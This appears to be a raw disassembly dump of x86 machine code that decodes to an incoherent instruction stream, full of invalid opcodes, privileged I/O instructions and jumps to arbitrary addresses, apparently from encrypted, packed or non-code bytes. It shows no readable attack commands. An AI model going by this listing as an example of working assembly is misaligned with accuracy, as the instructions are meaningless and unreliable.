  410ce5:	xor    al,0x59
  410ce7:	sar    DWORD PTR [ecx-0x73],1
  410cea:	call   0x6fd8f873
  410cef:	mov    bl,0x28
  410cf1:	cmp    al,0xe4
  410cf3:	fwait
  410cf4:	cmp    al,0xdf
  410cf6:	or     DWORD PTR [ebp+0x57866040],0xd9fddfaf
  410d00:	int3   
  410d01:	popf   
  410d02:	mov    al,0xad
  410d04:	addr16 sar esp,0x2e
  410d08:	cli    
  410d09:	pop    edi
  410d0a:	mov    BYTE PTR [edi-0x16],0x54
  410d0e:	push   ds
  410d0f:	enter  0xfdac,0x65
  410d13:	cmp    bl,BYTE PTR [esi]
  410d15:	adc    BYTE PTR [ecx],bl
  410d17:	daa    
  410d18:	arpl   WORD PTR [edi*8+0x57acb1c1],sp
  410d1f:	mov    al,ds:0x142423c7
  410d24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d25:	or     cl,BYTE PTR [esi-0x178694f7]
  410d2b:	mov    BYTE PTR [esi-0x14b8230f],0x2a
  410d32:	mov    esp,esp
  410d34:	mov    ds:0x5df211db,al
  410d39:	fild   QWORD PTR [ebx-0x2e]
  410d3c:	mov    edi,0x4bc9451f
  410d41:	(bad)  
  410d42:	nop
  410d43:	dec    edx
  410d44:	jmp    0xc64d:0x3e4f356b
  410d4b:	cmp    cl,cl
  410d4d:	sub    BYTE PTR [eax],0xc8
  410d50:	imul   esp,DWORD PTR [esi+0x42fe91e2],0xffffff97
  410d57:	cld    
  410d58:	jmp    0x410d15
  410d5a:	xchg   bx,ax
  410d5c:	mov    esp,0x2c0b2326
  410d61:	fmul   QWORD PTR [eax-0x5fe5e866]
  410d67:	cmp    edi,DWORD PTR [ebx]
  410d69:	mov    esp,0x65ebed3e
  410d6e:	pop    cx
  410d70:	mov    ds:0xfed284f2,al
  410d75:	fild   QWORD PTR [edi-0x4995cc33]
  410d7b:	fmulp  st(0),st
  410d7d:	sar    ah,1
  410d7f:	jmp    0x410d48
  410d81:	scas   al,BYTE PTR es:[edi]
  410d82:	mov    dl,0xce
  410d84:	addr16 push ecx
  410d86:	mov    edx,0x31ab5cc8
  410d8b:	(bad)  
  410d8c:	push   ebx
  410d8d:	js     0x410d4b
  410d8f:	scas   al,BYTE PTR es:[edi]
  410d90:	jmp    0x410dd9
  410d92:	imul   eax,DWORD PTR [ecx],0xffffffbd
  410d95:	and    al,0x22
  410d97:	lods   eax,DWORD PTR ds:[esi]
  410d98:	inc    eax
  410d99:	or     dl,dl
  410d9b:	imul   esp,DWORD PTR [eax-0x1f],0x336cbe7c
  410da2:	push   esi
  410da3:	neg    DWORD PTR [edx]
  410da5:	add    DWORD PTR [ebx-0x6a4a14b6],esp
  410dab:	add    DWORD PTR [eax-0x1ff734f],ebp
  410db1:	fist   WORD PTR [edi]
  410db3:	mov    bl,BYTE PTR [edx-0x77]
  410db6:	sbb    eax,0xf4349a91
  410dbb:	xor    esp,esi
  410dbd:	mov    ch,0x18
  410dbf:	test   al,0x5f
  410dc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410dc2:	xchg   ecx,eax
  410dc3:	mov    esi,0x27e6d476
  410dc8:	sub    ah,cl
  410dca:	cld    
  410dcb:	and    eax,0x38061266
  410dd0:	in     eax,dx
  410dd1:	inc    esp
  410dd2:	inc    eax
  410dd3:	xor    bl,BYTE PTR [edx]
  410dd5:	aas    
  410dd6:	lock dec edx
  410dd8:	mov    ch,0xf4
  410dda:	aad    0xbc
  410ddc:	sub    BYTE PTR [eax+0x43],cl
  410ddf:	enter  0x1b58,0x25
  410de3:	xchg   esp,eax
  410de4:	(bad)  
  410de5:	cld    
  410de6:	cld    
  410de7:	test   ebp,esp
  410de9:	ins    DWORD PTR es:[edi],dx
  410dea:	pop    ecx
  410deb:	fst    st(6)
  410ded:	js     0x410d79
  410def:	into   
  410df0:	in     al,dx
  410df1:	idiv   DWORD PTR [esi+0x4e900b87]
  410df7:	mov    BYTE PTR [ecx+0x48],al
  410dfa:	std    
  410dfb:	outs   dx,DWORD PTR ds:[esi]
  410dfc:	lods   al,BYTE PTR ds:[esi]
  410dfd:	inc    ebx
  410dfe:	cmp    BYTE PTR [ebx+0x4f],0x75
  410e02:	(bad)
  410e06:	jo     0x410e7d
  410e08:	mov    al,ds:0xebbd0578
  410e0d:	cmp    dl,BYTE PTR [eax]
  410e0f:	stc    
  410e10:	add    ah,dl
  410e12:	jl     0x410e3a
  410e14:	nop
  410e15:	fbld   TBYTE PTR [eax]
  410e17:	fs mov esp,0x4d6ac4e2
  410e1d:	psubb  mm7,QWORD PTR [ecx+0x57]
  410e21:	cmp    cl,BYTE PTR [esi]
  410e23:	push   ecx
  410e24:	push   edx
  410e25:	pop    edi
  410e26:	aam    0xa4
  410e28:	mov    ebx,0x1abd5e22
  410e2d:	(bad)  
  410e2e:	aaa    
  410e2f:	mov    DWORD PTR ds:0xbd483d06,0xebd1c90e
  410e39:	inc    ebx
  410e3a:	scas   al,BYTE PTR es:[edi]
  410e3b:	or     DWORD PTR [esi],esi
  410e3d:	fistp  DWORD PTR [ecx+edi*1-0x3a8f1f5f]
  410e44:	je     0x410e96
  410e46:	push   eax
  410e47:	mov    eax,0x5f7a9c04
  410e4c:	in     eax,dx
  410e4d:	dec    ebp
  410e4e:	mov    esi,0xacf70170
  410e53:	dec    eax
  410e54:	xchg   ebx,eax
  410e55:	fs int3 
  410e57:	ja     0x410e87
  410e59:	jmp    0x410eac
  410e5b:	out    0xfd,eax
  410e5d:	test   al,0x99
  410e5f:	dec    eax
  410e60:	push   ebp
  410e61:	mov    ds:0x9bfe9941,eax
  410e66:	jmp    FWORD PTR [ebx]
  410e68:	inc    ebp
  410e69:	pushf  
  410e6a:	or     eax,0x4d3c3474
  410e6f:	sub    BYTE PTR [ebp+0x2e],dh
  410e72:	mov    edi,0x91a181c8
  410e77:	in     eax,0x97
  410e79:	push   edi
  410e7a:	aam    0xa1
  410e7c:	jmp    0x5bc1526e
  410e81:	cdq    
  410e82:	pop    eax
  410e83:	test   al,0x4d
  410e85:	test   BYTE PTR [ebp-0x7b72fd42],0xe3
  410e8c:	jmp    0x7cca:0x87f63dd4
  410e93:	push   ecx
  410e94:	shl    DWORD PTR [eax-0x36141258],0x5e
  410e9b:	lds    ebp,FWORD PTR [eax]
  410e9d:	repz fst DWORD PTR ds:0xf36ce865
  410ea4:	bound  edx,QWORD PTR ds:0xe0356550
  410eaa:	ret    0xc52c
  410ead:	fistp  WORD PTR [edi]
  410eaf:	xor    eax,0xb8fd5069
  410eb4:	jl     0x410ef3
  410eb6:	or     ecx,DWORD PTR ds:0xcf7e7dcd
  410ebc:	(bad)  
  410ebd:	jns    0x410e51
  410ebf:	(bad)  
  410ec0:	fstp   QWORD PTR [edi+0x47]
  410ec3:	push   esi
  410ec4:	push   0xffffff8c
  410ec6:	jp     0x410e5e
  410ec8:	jmp    0x410e64
  410eca:	lods   al,BYTE PTR ds:[esi]
  410ecb:	sub    DWORD PTR [ebx],ecx
  410ecd:	jnp    0x410e5a
  410ecf:	ret    0x3b51
  410ed2:	enterw 0xa80f,0x37
  410ed7:	sub    esp,DWORD PTR [ecx]
  410ed9:	jle    0x410f20
  410edb:	sub    ebx,0x23
  410ede:	test   BYTE PTR [esi+0x60],cl
  410ee1:	adc    DWORD PTR [ecx+0x5adf5326],esi
  410ee7:	into   
  410ee8:	push   es
  410ee9:	lea    esi,[eax]
  410eeb:	dec    ebp
  410eec:	retf   0xf9a7
  410eef:	jae    0x410ed1
  410ef1:	dec    ebp
  410ef2:	bound  esi,QWORD PTR [edx-0x15]
  410ef5:	pop    esp
  410ef6:	ret    0x758e
  410ef9:	leave  
  410efa:	inc    esi
  410efb:	enter  0x5f05,0xf7
  410eff:	int3   
  410f00:	jp     0x410e9e
  410f02:	sbb    DWORD PTR [ebx-0x15],eax
  410f05:	gs push 0x332c2519
  410f0b:	inc    DWORD PTR [esi-0x59]
  410f0e:	and    eax,0xb636ee93
  410f13:	sub    eax,0xa7fc7f8b
  410f18:	aaa    
  410f19:	inc    esi
  410f1a:	add    BYTE PTR [ecx-0x1d],dh
  410f1d:	and    BYTE PTR [ebp+0x6837152e],dh
  410f23:	pop    ss
  410f24:	xor    al,0xdf
  410f26:	pop    DWORD PTR [ebx+0x6a0adcbb]
  410f2c:	xor    eax,0x88b9fd24
  410f31:	xchg   edx,eax
  410f32:	test   DWORD PTR [esi-0x382fd6b4],0xdcccc76c
  410f3c:	popa   
  410f3d:	cmp    al,0x88
  410f3f:	fidivr WORD PTR [ebx+0x2]
  410f42:	(bad)  
  410f43:	xchg   edi,eax
  410f44:	out    0x34,al
  410f46:	inc    edx
  410f47:	mov    ah,0x5e
  410f49:	and    BYTE PTR [ebp+0x2d7dcfc2],ch
  410f4f:	enter  0xbf6d,0x8a
  410f53:	push   es
  410f54:	imul   ebp,DWORD PTR [ebx],0xffffffeb
  410f57:	and    esi,0x1962aba8
  410f5d:	ds mov ebp,0xb225b1f8
  410f63:	enter  0x6852,0x51
  410f67:	push   0xffffff9f
  410f69:	shl    BYTE PTR [eax+0x20dec06],cl
  410f6f:	dec    ebx
  410f70:	inc    esp
  410f71:	aaa    
  410f72:	xor    eax,0x6854acfc
  410f77:	scas   al,BYTE PTR es:[edi]
  410f78:	aaa    
  410f79:	stos   BYTE PTR es:[edi],al
  410f7a:	mov    ch,0x2c
  410f7c:	dec    esi
  410f7d:	fbstp  TBYTE PTR [ebx+0x19]
  410f80:	je     0x410fce
  410f82:	xchg   ebx,eax
  410f83:	cmp    BYTE PTR [ecx-0x38],bl
  410f86:	cld    
  410f87:	mov    esi,0xcd2cd506
  410f8c:	sub    dh,BYTE PTR [ebx+0x3a12c7e2]
  410f92:	xor    cl,bh
  410f94:	push   0x66
  410f96:	fdivr  DWORD PTR [eax-0x15]
  410f99:	xor    DWORD PTR [ecx],ebp
  410f9b:	pusha  
  410f9c:	mov    dh,0x65
  410f9e:	jl     0x410f61
  410fa0:	add    DWORD PTR [esi],0x1f
  410fa3:	fsubr  QWORD PTR [ebx+0x2f]
  410fa6:	clc    
  410fa7:	pushf  
  410fa8:	out    dx,eax
  410fa9:	dec    esi
  410faa:	push   0x30d9ebc0
  410faf:	repz inc ebx
  410fb1:	mov    eax,0x7d6886a
  410fb6:	int3   
  410fb7:	jp     0x410fa5
  410fb9:	or     bl,bh
  410fbb:	push   es
  410fbc:	cmp    eax,0xa2989f52
  410fc1:	lea    edx,[eax]
  410fc3:	push   edx
  410fc4:	dec    esp
  410fc5:	mov    ebp,0xdfc57b6c
  410fca:	ror    DWORD PTR [eax-0x26],cl
  410fcd:	pop    edx
  410fce:	ds dec esp
  410fd0:	mov    ebp,0x757afd7c
  410fd5:	sub    ecx,DWORD PTR [eax]
  410fd7:	jmp    0xc89c65bd
  410fdc:	pop    esi
  410fdd:	ins    BYTE PTR es:[edi],dx
  410fde:	mov    bl,BYTE PTR [edi*8-0x15ac2b5a]
  410fe5:	pop    ebp
  410fe6:	or     al,0x6c
  410fe8:	adc    ch,0x22
  410feb:	adc    DWORD PTR [edi],esi
  410fed:	push   0xffffff95
  410fef:	cmp    al,0x16
  410ff1:	fbstp  TBYTE PTR [ebx-0xa70f64b]
  410ff7:	mov    eax,ds:0x850030de
  410ffc:	jno    0x411037
  410ffe:	stos   BYTE PTR es:[edi],al
  410fff:	fidiv  WORD PTR [edi]
  411001:	xor    DWORD PTR [bx+si],edx
  411004:	pop    ds
  411005:	fist   WORD PTR [ecx]
  411007:	je     0x411043
  411009:	push   cs
  41100a:	scas   al,BYTE PTR es:[edi]
  41100b:	inc    ebp
  41100c:	lods   al,BYTE PTR ds:[esi]
  41100d:	fdivp  st(4),st
  41100f:	call   0x9e149ab5
  411014:	sti    
  411015:	xor    BYTE PTR [ecx-0x28b43e35],0x1a
  41101c:	jmp    0x65fda5f1
  411021:	xor    al,BYTE PTR [eax]
  411023:	add    al,0xe3
  411025:	adc    cl,dl
  411027:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411028:	shl    BYTE PTR [ebp-0x5],cl
  41102b:	mov    bh,0xde
  41102d:	pop    ecx
  41102e:	ja     0x410ff8
  411030:	or     al,0xbd
  411032:	adc    eax,0x598964d9
  411037:	xchg   bl,ch
  411039:	xor    eax,0x7ffcd698
  41103e:	jb     0x4110be
  411040:	push   esi
  411041:	push   ebx
  411042:	mov    al,cl
  411044:	pop    ds
  411045:	mov    esp,0xdebf7d90
  41104a:	sbb    BYTE PTR [edx-0x52347f15],bl
  411050:	call   DWORD PTR [edi]
  411052:	xchg   esi,eax
  411053:	jle    0x410fe3
  411055:	fbld   TBYTE PTR [ecx-0x63ae6d32]
  41105b:	retf   
  41105c:	inc    eax
  41105d:	mov    ecx,0x327f80fc
  411062:	xchg   ebp,eax
  411063:	adc    DWORD PTR [esi],0x58
  411066:	cmp    al,0xc7
  411068:	inc    esi
  411069:	dec    esi
  41106a:	sub    DWORD PTR [ecx*8-0x5750dae1],0x6
  411072:	std    
  411073:	xor    al,0x99
  411075:	lods   eax,DWORD PTR ds:[esi]
  411076:	fdiv   st(2),st
  411078:	nop
  411079:	add    eax,0xbbeccbc7
  41107e:	mov    ebx,DWORD PTR [ebp+0x288d7747]
  411084:	jo     0x411057
  411086:	in     eax,0x9a
  411088:	scas   eax,DWORD PTR es:[edi]
  411089:	arpl   WORD PTR [ebp-0x40891093],bp
  41108f:	aam    0x2c
  411091:	lahf   
  411092:	hlt    
  411093:	and    al,0x90
  411095:	cmp    al,0x2d
  411097:	jno    0x41107c
  411099:	loop   0x41107a
  41109b:	daa    
  41109c:	ror    DWORD PTR ds:0x4407fb,cl
  4110a2:	sub    BYTE PTR [edx+0x74671ceb],ah
  4110a8:	pushf  
  4110a9:	iret   
  4110aa:	pop    ds
  4110ab:	sbb    ecx,DWORD PTR [ebx+0x396319df]
  4110b1:	enter  0x2738,0x20
  4110b5:	pop    ecx
  4110b6:	std    
  4110b7:	repz jns 0x41106a
  4110ba:	ins    BYTE PTR es:[edi],dx
  4110bb:	xchg   ecx,eax
  4110bc:	pop    edx
  4110bd:	push   esp
  4110be:	stc    
  4110bf:	int    0xac
  4110c1:	shl    al,1
  4110c3:	sbb    ch,BYTE PTR [ebx+0x3f]
  4110c6:	out    dx,al
  4110c7:	xchg   BYTE PTR [edx],cl
  4110c9:	and    bh,ch
  4110cb:	iret   
  4110cc:	xchg   BYTE PTR [ebp+0x68],dl
  4110cf:	loopne 0x411104
  4110d1:	push   eax
  4110d2:	push   ss
  4110d3:	loopne 0x4110bf
  4110d5:	or     bh,ch
  4110d7:	sbb    ch,al
  4110d9:	sbb    al,0x59
  4110db:	dec    esi
  4110dc:	shl    eax,1
  4110de:	cld    
  4110df:	mov    ah,0x76
  4110e1:	in     eax,dx
  4110e2:	xor    bh,BYTE PTR [esp+ebp*4+0x68c884e3]
  4110e9:	sbb    esi,esi
  4110eb:	and    al,0xb5
  4110ed:	adc    al,0xff
  4110ef:	pop    es
  4110f0:	jmp    0x4110f2
  4110f2:	not    esp
  4110f4:	sbb    eax,0x5abb5881
  4110f9:	fistp  WORD PTR [edi]
  4110fb:	sub    DWORD PTR [eax-0x19889fe0],ebx
  411101:	daa    
  411102:	std    
  411103:	popa   
  411104:	jb     0x4110a7
  411106:	fsubr  DWORD PTR [esi+0x12]
  411109:	sbb    DWORD PTR [ecx-0x35],edx
  41110c:	or     BYTE PTR [ebp+0x61],bl
  41110f:	mov    al,0x4
  411111:	jbe    0x4110e0
  411113:	mov    dl,0x4a
  411115:	sar    ah,1
  411117:	jne    0x411112
  411119:	addr16 pop es
  41111b:	ret    
  41111c:	jp     0x4110b2
  41111e:	shl    BYTE PTR [eax-0x3f0820e4],1
  411124:	hlt    
  411125:	mov    eax,0xe9480f0d
  41112a:	cld    
  41112b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41112c:	add    ebx,DWORD PTR [esi+edx*8]
  41112f:	ret    0x1cea
  411132:	mov    WORD PTR [eax-0x2a018de5],es
  411138:	sub    ebx,DWORD PTR [edx]
  41113a:	jmp    0x9758ba1c
  41113f:	out    dx,al
  411140:	jmp    0x4111ba
  411142:	pop    esi
  411143:	sbb    eax,0xa5b38c14
  411148:	pop    ebx
  411149:	inc    ebx
  41114a:	je     0x411114
  41114c:	cdq    
  41114d:	jo     0x41116a
  41114f:	leave  
  411150:	cmp    DWORD PTR ss:[eax+0x752df433],edx
  411157:	dec    eax
  411158:	repnz pop edi
  41115a:	(bad)  
  41115b:	popf   
  41115c:	mov    ebx,0x6cc7feca
  411161:	xchg   DWORD PTR [edx],eax
  411163:	adc    eax,0x2e0717e
  411168:	jmp    0x411106
  41116a:	not    BYTE PTR [ebp+0x35]
  41116d:	in     al,dx
  41116e:	inc    edx
  41116f:	push   ebp
  411170:	int3   
  411171:	fild   QWORD PTR ds:0x3ee12fb
  411177:	pushf  
  411178:	in     al,dx
  411179:	pusha  
  41117a:	inc    ecx
  41117b:	or     BYTE PTR [edx],0xd0
  41117e:	cld    
  41117f:	rol    ah,cl
  411181:	fs in  eax,dx
  411183:	xor    DWORD PTR [edi],ecx
  411185:	pop    edi
  411186:	cmp    bh,BYTE PTR [edi+0x481d260b]
  41118c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41118d:	cwde   
  41118e:	add    eax,0xfd3cc77e
  411193:	bnd jb 0x4111ff
  411196:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411197:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411198:	ss sub eax,0xddc49454
  41119e:	xor    DWORD PTR [esi-0x5d4ea751],esp
  4111a4:	or     ecx,DWORD PTR [ecx+0x4beb789f]
  4111aa:	mov    ebp,?
  4111ac:	jl     0x4111f4
  4111ae:	lods   eax,DWORD PTR ds:[esi]
  4111af:	and    eax,0x644adddd
  4111b4:	push   ecx
  4111b5:	push   ebx
  4111b6:	dec    edx
  4111b7:	xor    ebp,DWORD PTR [ebx]
  4111b9:	dec    edi
  4111ba:	jl     0x41114e
  4111bc:	(bad)  
  4111bd:	stc    
  4111be:	paddusb mm5,mm2
  4111c1:	jle    0x411222
  4111c3:	adc    cl,BYTE PTR [ebx+0x1537a907]
  4111c9:	fistp  WORD PTR [edx+0x4e791d86]
  4111cf:	pop    ss
  4111d0:	xchg   al,dh
  4111d2:	add    BYTE PTR [edx],ch
  4111d4:	add    edx,DWORD PTR [edx]
  4111d6:	inc    eax
  4111d7:	jl     0x4111b8
  4111d9:	test   cl,0x28
  4111dc:	jp     0x4111dd
  4111de:	mov    ebp,0xdb3c9dc8
  4111e3:	and    al,0x74
  4111e5:	aaa    
  4111e6:	or     DWORD PTR [edi-0x14],ebp
  4111e9:	mov    edx,0xb778bb4e
  4111ee:	xlat   BYTE PTR ds:[ebx]
  4111ef:	in     al,dx
  4111f0:	retf   
  4111f1:	aas    
  4111f2:	ret    
  4111f3:	enter  0x9d4,0x3e
  4111f7:	jg     0x4111b5
  4111f9:	mov    esp,0xffe618b7
  4111fe:	clc    
  4111ff:	inc    ebp
  411200:	aas    
  411201:	xchg   ebp,eax
  411202:	pushf  
  411203:	repz pop edi
  411205:	aas    
  411206:	dec    esp
  411207:	enter  0x4706,0xce
  41120b:	cmp    eax,0x1a2aeaea
  411210:	jmp    0x411285
  411212:	xchg   ebx,eax
  411213:	loop   0x41127a
  411215:	sub    eax,0xe001b567
  41121a:	nop
  41121b:	xchg   edi,eax
  41121c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41121d:	retf   0x3ff5
  411220:	mov    ebp,0xebd7a722
  411225:	pop    es
  411226:	fild   DWORD PTR [ecx+ecx*2-0x43]
  41122a:	dec    edi
  41122b:	psadbw mm3,mm7
  41122e:	data16 or bh,dh
  411231:	call   0xeafd:0x8d314fdc
  411238:	push   eax
  411239:	frstor [eax-0x7]
  41123c:	mov    ch,0x9
  41123e:	sbb    bh,BYTE PTR [eax]
  411240:	or     edi,ebx
  411242:	orps   xmm6,XMMWORD PTR [edi-0x80]
  411246:	shr    BYTE PTR [ebx+0x7afd6c04],cl
  41124c:	arpl   WORD PTR [edi],bp
  41124e:	test   DWORD PTR [esi-0x373bebac],edi
  411254:	or     al,BYTE PTR [edi+ecx*2+0x49b04396]
  41125b:	inc    edi
  41125c:	jmp    0x4112d6
  41125e:	repnz addr16 adc al,0x46
  411262:	loope  0x411240
  411264:	xor    al,0xdf
  411266:	jle    0x411228
  411268:	mov    ebx,0xf6db972
  41126d:	test   ah,bh
  41126f:	stos   BYTE PTR es:[edi],al
  411270:	mov    BYTE PTR [edx+ebp*4+0x50d45509],dl
  411277:	enter  0xf5a2,0x44
  41127b:	cmp    ebx,DWORD PTR [ecx+0x9f5d1ca]
  411281:	out    0xd9,al
  411283:	dec    eax
  411284:	addr16 mov cl,0x1d
  411287:	enter  0x64f1,0x1b
  41128b:	nop
  41128c:	ds mov bh,0xfc
  41128f:	xlat   BYTE PTR ds:[ebx]
  411290:	mov    edi,0x2783da46
  411295:	sahf   
  411296:	and    DWORD PTR [esi+0x4519e141],edi
  41129c:	jecxz  0x4112b2
  41129e:	mov    ebp,0x9ab4f509
  4112a3:	clc    
  4112a4:	or     eax,0xeae8f815
  4112a9:	push   ecx
  4112aa:	sbb    DWORD PTR [eax+0x5],ecx
  4112ad:	cmc    
  4112ae:	iret   
  4112af:	push   ebx
  4112b0:	out    dx,eax
  4112b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112b2:	repz shr ebx,cl
  4112b5:	hlt    
  4112b6:	ins    BYTE PTR es:[edi],dx
  4112b7:	ins    DWORD PTR es:[edi],dx
  4112b8:	aas    
  4112b9:	push   edx
  4112ba:	pushf  
  4112bb:	das    
  4112bc:	jmp    0x411246
  4112be:	loope  0x411273
  4112c0:	lds    edx,FWORD PTR [esi-0x1f7adde3]
  4112c6:	retf   
  4112c7:	mov    al,0xaa
  4112c9:	pop    ds
  4112ca:	sub    bl,dh
  4112cc:	stos   DWORD PTR es:[edi],eax
  4112cd:	jle    0x41125c
  4112cf:	and    bl,al
  4112d1:	icebp  
  4112d2:	cld    
  4112d3:	jmp    0x574e41e9
  4112d8:	inc    edx
  4112d9:	cld    
  4112da:	fcmovnb st,st(6)
  4112dc:	and    edx,esp
  4112de:	and    ebx,eax
  4112e0:	data16 (bad) 
  4112e2:	bound  esi,QWORD PTR [eax+0x14fcb36d]
  4112e8:	sbb    al,0xae
  4112ea:	add    eax,0xd7253929
  4112ef:	(bad)  
  4112f0:	sub    bh,BYTE PTR [edx-0x42]
  4112f3:	in     al,dx
  4112f4:	and    eax,0xebf95f63
  4112f9:	xchg   ecx,eax
  4112fa:	xor    esi,DWORD PTR [eax*8+0x3ee231dd]
  411301:	fild   QWORD PTR [ecx+eax*4+0x2387938b]
  411308:	pop    edx
  411309:	paddw  mm7,QWORD PTR [edx-0x13]
  41130d:	lea    edi,[ecx+0x4c]
  411310:	data16 mov ds:0x534fc7d0,al
  411316:	jle    0x411338
  411318:	cwde   
  411319:	xchg   ecx,eax
  41131a:	loop   0x411330
  41131c:	pop    es
  41131d:	add    edi,ebp
  41131f:	je     0x4112a5
  411321:	dec    ebx
  411322:	(bad)  
  411323:	fstp   TBYTE PTR [esp+ebx*2-0x11cf3824]
  41132a:	(bad)  
  41132b:	pop    esi
  41132c:	inc    ebx
  41132d:	aas    
  41132e:	cmc    
  41132f:	in     eax,dx
  411330:	jmp    0x41133b
  411332:	test   eax,0xf378b8b2
  411337:	imul   eax,DWORD PTR [edi+0x1b9ca4df],0xa7f86bf2
  411341:	jns    0x411374
  411343:	mov    eax,0x25bedf53
  411348:	add    ebp,DWORD PTR ds:0xdfc6d535
  41134e:	stos   BYTE PTR es:[edi],al
  41134f:	push   edx
  411350:	clc    
  411351:	loope  0x41138a
  411353:	pop    ebp
  411354:	xchg   ebp,eax
  411355:	jecxz  0x411353
  411357:	adc    dh,BYTE PTR [eax-0x13ffb9f4]
  41135d:	nop
  41135e:	sar    BYTE PTR [ebp-0x37c74a45],cl
  411364:	ror    BYTE PTR [edx-0x38e1c24c],0xe0
  41136b:	mov    BYTE PTR [ecx+0x12bb09df],bh
  411371:	adc    eax,0xcaf1c597
  411376:	out    dx,al
  411377:	(bad)  
  411378:	cmp    ebx,DWORD PTR [edi-0x1d]
  41137b:	daa    
  41137c:	and    eax,0x95fbd83b
  411381:	push   edi
  411382:	hlt    
  411383:	xchg   esi,eax
  411384:	stos   BYTE PTR es:[edi],al
  411385:	jae    0x4113f7
  411387:	mov    ah,0x13
  411389:	fist   WORD PTR [edx+0x5654f8ce]
  41138f:	xor    BYTE PTR [edx-0x21],ah
  411392:	cs adc eax,0x61ee8a9e
  411398:	mov    bl,0x2
  41139a:	aad    0x63
  41139c:	push   0x21
  41139e:	std    
  41139f:	sar    DWORD PTR [ebx+0x77cfdd1a],1
  4113a5:	mov    edi,0x6453c8b9
  4113aa:	popa   
  4113ab:	jmp    0x54b21454
  4113b0:	jmp    0x411365
  4113b2:	xchg   ecx,eax
  4113b3:	outs   dx,DWORD PTR ds:[esi]
  4113b4:	pushf  
  4113b5:	out    0xb6,al
  4113b7:	add    ebp,esi
  4113b9:	(bad)  
  4113bb:	and    esi,DWORD PTR [eax+0xbfcf0da]
  4113c1:	cdq    
  4113c2:	aam    0xfd
  4113c4:	in     al,dx
  4113c5:	cmp    DWORD PTR [edx+0x19eb9e32],esp
  4113cb:	xchg   esp,eax
  4113cc:	das    
  4113cd:	repnz repz pushf 
  4113d0:	ret    0xadf
  4113d3:	push   eax
  4113d4:	scas   eax,DWORD PTR es:[edi]
  4113d5:	and    BYTE PTR [ecx-0x2c8dbd5],0xd1
  4113dc:	hlt    
  4113dd:	sub    al,0x14
  4113df:	xor    BYTE PTR [eax+0x7a],0x49
  4113e3:	enter  0x89f7,0xde
  4113e7:	mov    ebp,0x90dc08e5
  4113ec:	mov    eax,ds:0x582effa1
  4113f1:	ds pushf 
  4113f3:	mov    dh,bl
  4113f5:	daa    
  4113f6:	cmp    DWORD PTR [edx],esi
  4113f8:	test   DWORD PTR [edx-0x3b],esi
  4113fb:	loopne 0x4113e6
  4113fd:	shl    BYTE PTR [ebp+0x33a055ed],cl
  411403:	test   al,0xb
  411405:	fs or  eax,0x79bb34ac
  41140c:	lds    ebp,FWORD PTR ds:0x7debd732
  411412:	pusha  
  411413:	xchg   ebx,eax
  411414:	fsubr  QWORD PTR [eax-0x2d]
  411417:	and    bh,BYTE PTR [ebp+0x3d97c5df]
  41141d:	frstor ds:0xfd724867
  411423:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411424:	add    al,0xf4
  411426:	xor    eax,DWORD PTR ds:0xc7e74f81
  41142c:	mov    eax,ds:0x56e0a7a0
  411431:	xor    DWORD PTR [eax],esi
  411433:	es jmp 0x41142b
  411436:	idiv   dl
  411438:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411439:	call   0x38c794c3
  41143e:	cdq    
  41143f:	imul   ecx,DWORD PTR [ebp+0x5dd640df],0x352fa4b
  411449:	xor    bh,ch
  41144b:	int    0xba
  41144d:	ret    0x1aba
  411450:	inc    ebx
  411451:	(bad)  
  411452:	pop    ebx
  411453:	mov    edi,0x88c9b6b6
  411458:	jmp    0xc9d250f8
  41145d:	inc    esp
  41145e:	loope  0x4114c8
  411460:	cli    
  411461:	inc    esp
  411462:	std    
  411463:	and    eax,0x8b80f1de
  411468:	push   esi
  411469:	popa   
  41146a:	or     al,0xf2
  41146d:	dec    ebp
  41146e:	(bad)  
  41146f:	sahf   
  411470:	adc    ebp,DWORD PTR [ebp*1+0x3ec2ebdc]
  411477:	dec    edi
  411478:	ficom  DWORD PTR [edx+esi*2]
  41147b:	or     edx,DWORD PTR [ebx+ebx*4+0x2aebf0c0]
  411482:	cmp    ebp,DWORD PTR [edx+0x9705fbe]
  411488:	int    0x3c
  41148a:	sub    ecx,edx
  41148c:	out    0x49,al
  41148e:	imul   ecx,DWORD PTR ss:0x81e8785f,0x49c7e4a2
  411499:	and    eax,0x4b23a5c6
  41149e:	addr16 jmp 0x8c5:0x26c95ceb
  4114a6:	fxch   st(4)
  4114a8:	jae    0x411489
  4114aa:	inc    ebx
  4114ab:	or     BYTE PTR [edx],dh
  4114ad:	push   es
  4114ae:	pusha  
  4114af:	icebp  
  4114b0:	lods   eax,DWORD PTR ds:[esi]
  4114b1:	gs std 
  4114b3:	xchg   DWORD PTR [esi-0x2a],esi
  4114b6:	push   ecx
  4114b7:	add    bh,dl
  4114b9:	push   ebp
  4114ba:	xchg   edi,eax
  4114bb:	retf   0xf99f
  4114be:	int    0xa7
  4114c0:	add    BYTE PTR [ebx-0x6a6d3fc4],bh
  4114c6:	add    eax,DWORD PTR [ebp-0x2f]
  4114c9:	idiv   eax
  4114cb:	sar    ecx,0xef
  4114ce:	pop    esp
  4114cf:	(bad)  
  4114d0:	cli    
  4114d1:	mov    esp,0x8f859a41
  4114d6:	jge    0x411523
  4114d8:	lahf   
  4114d9:	popa   
  4114da:	std    
  4114db:	xchg   esi,eax
  4114dc:	sbb    eax,0x625a4a15
  4114e1:	mov    eax,esi
  4114e3:	(bad)  
  4114e4:	adc    BYTE PTR [edx],al
  4114e6:	fwait
  4114e7:	push   ecx
  4114e8:	leave  
  4114e9:	xor    bl,BYTE PTR [edx+0x2cabeb8f]
  4114ef:	xor    ebx,DWORD PTR [edx-0x3a]
  4114f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114f3:	arpl   WORD PTR [edi+ebx*8],si
  4114f6:	in     al,0x53
  4114f8:	jbe    0x41148c
  4114fa:	psubq  mm7,QWORD PTR [esp+eiz*4]
  4114fe:	cld    
